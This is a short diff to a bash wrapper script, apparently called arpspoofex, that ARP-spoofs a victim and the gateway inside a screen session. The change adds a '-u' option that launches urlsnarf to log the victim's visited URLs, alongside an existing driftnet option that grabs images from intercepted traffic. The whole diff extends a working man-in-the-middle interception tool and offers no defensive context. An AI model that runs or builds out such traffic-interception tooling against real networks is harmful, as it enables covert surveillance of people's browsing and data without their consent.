@@ -10,7 +10,7 @@
 
 RCFILE="/tmp/arpspoofex.rc"
 
-while getopts "hndv:r:i:" opt 
+while getopts "hnduv:r:i:" opt 
 do
 	case $opt in
 		h)	# Help
@@ -28,6 +28,7 @@ do
 			echo -e "\t\t\tStandard: the default gateway IP address if not set."
 			echo ""
 			echo -e "-d\t\t\tStart Driftnet"
+			echo -e "-u\t\t\tStart urlsnarf"
 			exit 1
 		;;
 		i)	# Interface
@@ -45,6 +46,9 @@ do
 		### Optional Scripts
 		d)	# Driftnet
 			DRIFTNET=true
+		;;
+		u)	# Urlsnarf
+			URLSNARF=true
 		;;
 	esac
 done
@@ -88,6 +92,11 @@ echo -e "screen -t arpspoof arpspoof -i $INTERFACE -r -t $GATEWAY $VICTIM" >> $R
 if [ "$DRIFTNET" == "true" ]
 then
 	driftnet -i $INTERFACE &
+fi
+
+if [ "$URLSNARF" == "true" ]
+then
+	echo -e "screen -t urlsnarf urlsnarf -i $INTERFACE" >> $RCFILE
 fi
 
 echo -e "screen -r -t Main" >> $RCFILE
